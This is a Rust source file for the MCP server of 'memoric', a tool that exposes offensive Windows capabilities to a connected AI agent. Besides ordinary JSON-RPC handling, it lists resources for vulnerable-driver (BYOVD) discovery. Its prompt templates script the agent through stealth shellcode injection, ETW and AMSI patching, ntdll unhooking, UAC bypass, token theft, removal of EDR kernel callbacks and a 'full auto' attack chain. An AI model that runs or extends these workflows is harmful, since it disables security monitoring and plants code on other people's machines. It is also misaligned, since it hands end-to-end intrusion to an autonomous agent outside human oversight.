//! MCP Server implementation

use crate::error::Result;
use serde_json::Value;
use tracing::{error, info};

/// Run the MCP server over STDIO
pub fn run_server() -> Result<()> {
    info!("Starting MCP server with STDIO transport");
    run_stdio_server()?;
    Ok(())
}

/// STDIO server loop
fn run_stdio_server() -> Result<()> {
    use std::io::{self, BufRead, Write};

    let stdin = io::stdin();
    let mut stdout = io::stdout();

    info!("MCP server ready, waiting for requests...");

    let mut consecutive_errors: u32 = 0;
    const MAX_CONSECUTIVE_ERRORS: u32 = 50;

    for line in stdin.lock().lines() {
        let line = match line {
            Ok(l) => l,
            Err(e) => {
                error!("Failed to read line: {}", e);
                consecutive_errors += 1;
                if consecutive_errors >= MAX_CONSECUTIVE_ERRORS {
                    error!(
                        "Too many consecutive read errors ({}), shutting down",
                        consecutive_errors
                    );
                    break;
                }
                continue;
            }
        };

        // Skip empty lines and whitespace-only lines
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue;
        }

        // Reset error counter on valid input
        consecutive_errors = 0;

        match handle_request(trimmed) {
            Ok(response) => {
                if !response.is_empty() {
                    if let Err(e) = writeln!(stdout, "{}", response) {
                        error!("Failed to write response: {}", e);
                        // stdout broken — likely pipe closed, shut down gracefully
                        break;
                    }
                    if let Err(e) = stdout.flush() {
                        error!("Failed to flush stdout: {}", e);
                        break;
                    }
                }
            }
            Err(e) => {
                error!("Failed to handle request: {}", e);
                // Try to send a parse error response (JSON-RPC -32700)
                let error_response = format!(
                    r#"{{"jsonrpc":"2.0","error":{{"code":-32700,"message":"{}"}},"id":null}}"#,
                    e.replace('"', "'")
                );
                let _ = writeln!(stdout, "{}", error_response);
                let _ = stdout.flush();
            }
        }
    }

    Ok(())
}

/// Handle a JSON-RPC request
fn handle_request(request: &str) -> std::result::Result<String, String> {
    use serde_json::Value;

    // Parse the request
    let value: Value =
        serde_json::from_str(request).map_err(|e| format!("Failed to parse JSON: {}", e))?;

    // Validate JSON-RPC 2.0
    let jsonrpc = value.get("jsonrpc").and_then(|v| v.as_str());
    if jsonrpc != Some("2.0") {
        return Err("Invalid JSON-RPC version".to_string());
    }

    // Get method
    let method = value
        .get("method")
        .and_then(|v| v.as_str())
        .ok_or("Missing method")?;

    // Get id - must be present and not null for requests
    let id = match value.get("id") {
        Some(Value::Null) => return Ok(String::new()), // Notification, no response
        Some(id_value) => id_value.clone(),
        None => return Ok(String::new()), // No id, no response
    };

    // Handle the method
    let result = match method {
        "initialize" => handle_initialize(&value),
        "tools/list" => handle_tools_list(),
        "tools/call" => handle_tools_call(&value),
        "resources/list" => handle_resources_list(),
        "resources/read" => handle_resources_read(&value),
        "prompts/list" => handle_prompts_list(),
        "prompts/get" => handle_prompts_get(&value),
        "ping" => Ok(Value::Null),
        _ => {
            // JSON-RPC -32601: Method not found
            return Ok(format!(
                r#"{{"jsonrpc":"2.0","error":{{"code":-32601,"message":"Method not found: {}"}},"id":{}}}"#,
                method, id
            ));
        }
    };

    match result {
        Ok(result_value) => Ok(format!(
            r#"{{"jsonrpc":"2.0","result":{},"id":{}}}"#,
            result_value, id
        )),
        Err(e) => Ok(format!(
            r#"{{"jsonrpc":"2.0","error":{{"code":-32603,"message":"{}"}},"id":{}}}"#,
            e, id
        )),
    }
}

fn handle_initialize(_request: &Value) -> std::result::Result<Value, String> {
    info!("MCP client initializing");
    // Return the full result object (will be wrapped by handle_request)
    Ok(serde_json::json!({
        "protocolVersion": "2024-11-05",
        "capabilities": {
            "tools": {},
            "resources": {},
            "prompts": {}
        },
        "serverInfo": {
            "name": "memoric",
            "version": "0.3.0"
        }
    }))
}

fn handle_tools_list() -> std::result::Result<Value, String> {
    use crate::mcp::tools::register_tools;
    let tools = register_tools();
    Ok(serde_json::json!({ "tools": tools }))
}

fn handle_tools_call(request: &Value) -> std::result::Result<Value, String> {
    use crate::mcp::tools::call_tool;

    let params = request.get("params").ok_or("Missing params")?;

    let name = params
        .get("name")
        .and_then(|v| v.as_str())
        .ok_or("Missing tool name")?;

    let args = params
        .get("arguments")
        .cloned()
        .unwrap_or(Value::Object(serde_json::Map::new()));

    // Catch panics in tool handlers to prevent server crash
    let name_owned = name.to_string();
    match std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        call_tool(&name_owned, args)
    })) {
        Ok(result) => result,
        Err(panic_info) => {
            let panic_msg = if let Some(s) = panic_info.downcast_ref::<String>() {
                s.clone()
            } else if let Some(s) = panic_info.downcast_ref::<&str>() {
                s.to_string()
            } else {
                "Unknown panic in tool handler".to_string()
            };
            error!("PANIC in tool '{}': {}", name_owned, panic_msg);
            Err(format!(
                "Internal error in tool '{}': {}",
                name_owned, panic_msg
            ))
        }
    }
}

// ═════════════════════════════════════════════════════════════════════════════
// Resources - MCP resource providers
// ═════════════════════════════════════════════════════════════════════════════

fn handle_resources_list() -> std::result::Result<Value, String> {
    Ok(serde_json::json!({
        "resources": [
            {
                "uri": "memoric://status",
                "name": "Server Status",
                "description": "Current memoric server status, privilege level, and capabilities",
                "mimeType": "application/json"
            },
            {
                "uri": "memoric://processes",
                "name": "Process List",
                "description": "Running processes on the target system",
                "mimeType": "application/json"
            },
            {
                "uri": "memoric://scan-sessions",
                "name": "Scan Sessions",
                "description": "Active memory scan sessions (Cheat Engine-style)",
                "mimeType": "application/json"
            },
            {
                "uri": "memoric://drivers",
                "name": "Loaded Drivers",
                "description": "Available BYOVD drivers and their status",
                "mimeType": "application/json"
            }
        ]
    }))
}

fn handle_resources_read(request: &Value) -> std::result::Result<Value, String> {
    let params = request.get("params").ok_or("Missing params")?;
    let uri = params
        .get("uri")
        .and_then(|v| v.as_str())
        .ok_or("Missing resource URI")?;

    let content = match uri {
        "memoric://status" => {
            let admin = crate::privilege::uac::is_admin().unwrap_or(serde_json::json!(false));
            serde_json::json!({
                "server": "memoric",
                "version": "0.3.0",
                "is_admin": admin,
                "pid": std::process::id(),
                "tools_count": crate::mcp::tools::register_tools().len(),
                "capabilities": ["memory_rw", "injection", "evasion", "kernel_byovd", "orchestration"]
            })
        }
        "memoric://processes" => {
            crate::info::process::list_processes(&serde_json::json!({"limit": 200}))
                .unwrap_or_else(|e| serde_json::json!({"error": e.to_string()}))
        }
        "memoric://scan-sessions" => crate::memory::session::scan_list(&serde_json::json!({}))
            .unwrap_or_else(|e| serde_json::json!({"error": e.to_string()})),
        "memoric://drivers" => crate::kernel::discover_vulnerable_drivers(&serde_json::json!({}))
            .unwrap_or_else(|e| serde_json::json!({"error": e.to_string()})),
        _ => return Err(format!("Unknown resource URI: {}", uri)),
    };

    Ok(serde_json::json!({
        "contents": [{
            "uri": uri,
            "mimeType": "application/json",
            "text": serde_json::to_string_pretty(&content).unwrap_or_default()
        }]
    }))
}

// ═════════════════════════════════════════════════════════════════════════════
// Prompts - Pre-built workflow templates
// ═════════════════════════════════════════════════════════════════════════════

fn handle_prompts_list() -> std::result::Result<Value, String> {
    Ok(serde_json::json!({
        "prompts": [
            {
                "name": "stealth_inject",
                "description": "Guided stealth injection workflow: assess EDR → patch telemetry → unhook → inject → sleep encrypt",
                "arguments": [
                    {"name": "target_process", "description": "Target process name", "required": true},
                    {"name": "shellcode_hex", "description": "Hex-encoded shellcode", "required": true}
                ]
            },
            {
                "name": "privilege_escalation",
                "description": "Guided privilege escalation: check current level → try debug privilege → token manipulation → potato attack",
                "arguments": [
                    {"name": "target_privilege", "description": "Desired privilege level (admin/system)", "required": false}
                ]
            },
            {
                "name": "memory_forensics",
                "description": "Memory forensics workflow: enumerate processes → scan memory regions → search patterns → extract artifacts",
                "arguments": [
                    {"name": "target_pid", "description": "Process ID to analyze", "required": true},
                    {"name": "search_pattern", "description": "Hex pattern to search for", "required": false}
                ]
            },
            {
                "name": "kernel_attack",
                "description": "Kernel attack chain: load BYOVD driver → enumerate callbacks → disable EDR kernel hooks → elevate token",
                "arguments": [
                    {"name": "driver_name", "description": "Preferred BYOVD driver (e.g. dbutil, iqvw64e)", "required": false}
                ]
            },
            {
                "name": "full_auto",
                "description": "Fully automated orchestration: assess → plan → evade → inject → cleanup. Uses the orchestration engine.",
                "arguments": [
                    {"name": "target_pid", "description": "Target process ID", "required": true},
                    {"name": "shellcode_hex", "description": "Hex-encoded shellcode", "required": true},
                    {"name": "dry_run", "description": "If true, plan but don't execute", "required": false}
                ]
            }
        ]
    }))
}

fn handle_prompts_get(request: &Value) -> std::result::Result<Value, String> {
    let params = request.get("params").ok_or("Missing params")?;
    let name = params
        .get("name")
        .and_then(|v| v.as_str())
        .ok_or("Missing prompt name")?;
    let prompt_args = params
        .get("arguments")
        .cloned()
        .unwrap_or(serde_json::json!({}));

    match name {
        "stealth_inject" => {
            let target = prompt_args
                .get("target_process")
                .and_then(|v| v.as_str())
                .unwrap_or("explorer.exe");
            let shellcode = prompt_args
                .get("shellcode_hex")
                .and_then(|v| v.as_str())
                .unwrap_or("<shellcode>");
            Ok(serde_json::json!({
                "description": "Stealth injection workflow",
                "messages": [
                    {
                        "role": "user",
                        "content": {
                            "type": "text",
                            "text": format!(
                                "Execute a stealth injection into {}. Follow this exact sequence:\n\
                                1. Check privileges with privilege(action='check')\n\
                                2. Enable debug privilege with privilege(action='debug_priv')\n\
                                3. Quick EDR check with detect(action='edr_quick_check')\n\
                                4. Patch ETW with stealth(action='patch_etw')\n\
                                5. Patch AMSI with stealth(action='patch_amsi')\n\
                                6. Unhook ntdll with stealth(action='unhook_ntdll')\n\
                                7. Find target with target(action='ps_find', name='{}')\n\
                                8. Inject with inject(action='shellcode', pid=<PID>, method='mockingjay', shellcode='{}')\n\
                                9. Start sleep encryption with stealth(action='sleep_ekko', duration_ms=5000)",
                                target, target, shellcode
                            )
                        }
                    }
                ]
            }))
        }
        "privilege_escalation" => {
            let level = prompt_args
                .get("target_privilege")
                .and_then(|v| v.as_str())
                .unwrap_or("system");
            Ok(serde_json::json!({
                "description": "Privilege escalation workflow",
                "messages": [
                    {
                        "role": "user",
                        "content": {
                            "type": "text",
                            "text": format!(
                                "Escalate privileges to {} level. Follow this sequence:\n\
                                1. Check current status with privilege(action='check')\n\
                                2. Check UAC level with privilege(action='uac_status')\n\
                                3. Try debug privilege with privilege(action='debug_priv')\n\
                                4. If not admin, try privilege(action='uac_bypass')\n\
                                5. For SYSTEM, try privilege(action='token_steal', source_pid=<winlogon_pid>)\n\
                                6. If kernel driver available, try kernel(action='token_escalate', pid=<our_pid>)",
                                level
                            )
                        }
                    }
                ]
            }))
        }
        "memory_forensics" => {
            let pid = prompt_args
                .get("target_pid")
                .and_then(|v| v.as_str())
                .unwrap_or("<PID>");
            let pattern = prompt_args
                .get("search_pattern")
                .and_then(|v| v.as_str())
                .unwrap_or("");
            let scan_step = if pattern.is_empty() {
                "5. Skip pattern scan (no pattern specified)".to_string()
            } else {
                format!(
                    "5. Scan for pattern with memory(action='scan', pid={}, pattern='{}')",
                    pid, pattern
                )
            };
            Ok(serde_json::json!({
                "description": "Memory forensics workflow",
                "messages": [
                    {
                        "role": "user",
                        "content": {
                            "type": "text",
                            "text": format!(
                                "Perform memory forensics on PID {}. Follow this sequence:\n\
                                1. Get process info with target(action='ps_info', pid={})\n\
                                2. List modules with target(action='modules', pid={})\n\
                                3. Query memory regions with memory(action='query', pid={})\n\
                                4. Read PEB with self(action='peb', pid={})\n\
                                {}\n\
                                6. Report findings",
                                pid, pid, pid, pid, pid, scan_step
                            )
                        }
                    }
                ]
            }))
        }
        "kernel_attack" => {
            let driver = prompt_args
                .get("driver_name")
                .and_then(|v| v.as_str())
                .unwrap_or("auto");
            Ok(serde_json::json!({
                "description": "Kernel attack chain",
                "messages": [
                    {
                        "role": "user",
                        "content": {
                            "type": "text",
                            "text": format!(
                                "Execute kernel attack chain using {} driver. Follow this sequence:\n\
                                1. Check admin with privilege(action='check')\n\
                                2. Discover drivers with kernel(action='driver_discover')\n\
                                3. Load driver with kernel(action='driver_load', driver='{}')\n\
                                4. Enumerate kernel callbacks with kernel(action='enum_callbacks')\n\
                                5. Enumerate object callbacks with kernel(action='object_callback_enum')\n\
                                6. Remove EDR callbacks with kernel(action='remove_callback', index=<N>)\n\
                                7. Disable ETW-TI with kernel(action='etw_ti_remove')\n\
                                8. Enumerate minifilters with kernel(action='minifilter_enum')\n\
                                9. Escalate token with kernel(action='token_escalate', pid=<our_pid>)",
                                driver, driver
                            )
                        }
                    }
                ]
            }))
        }
        "full_auto" => {
            let pid = prompt_args
                .get("target_pid")
                .and_then(|v| v.as_str())
                .unwrap_or("<PID>");
            let shellcode = prompt_args
                .get("shellcode_hex")
                .and_then(|v| v.as_str())
                .unwrap_or("<shellcode>");
            let dry_run = prompt_args
                .get("dry_run")
                .and_then(|v| v.as_bool())
                .unwrap_or(false);
            Ok(serde_json::json!({
                "description": "Full auto orchestration",
                "messages": [
                    {
                        "role": "user",
                        "content": {
                            "type": "text",
                            "text": format!(
                                "Run fully automated attack orchestration.\n\
                                Use orchestrate(action='execute', pid={}, shellcode='{}', dry_run={}).\n\
                                This will:\n\
                                1. Assess the environment for EDR/AV/kernel protections\n\
                                2. Generate an adaptive evasion plan\n\
                                3. Execute each evasion step in sequence\n\
                                4. Inject shellcode into the target process\n\
                                5. Report results and any failures",
                                pid, shellcode, dry_run
                            )
                        }
                    }
                ]
            }))
        }
        _ => Err(format!("Unknown prompt: {}", name)),
    }
}
